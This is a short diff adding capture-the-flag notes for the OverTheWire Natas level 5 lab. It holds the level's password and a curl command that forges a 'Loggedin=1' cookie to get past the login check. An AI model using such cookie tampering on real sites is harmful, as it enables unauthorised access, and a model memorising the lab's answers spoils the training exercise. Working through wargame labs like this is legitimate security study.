@@ -1,1 +1,4 @@
 iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+- Inspect element to find under Network > Cookie: Loggedin=0
+- `curl -v -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -H 'Cookie: Loggedin=1' http://natas5.natas.labs.overthewire.org`
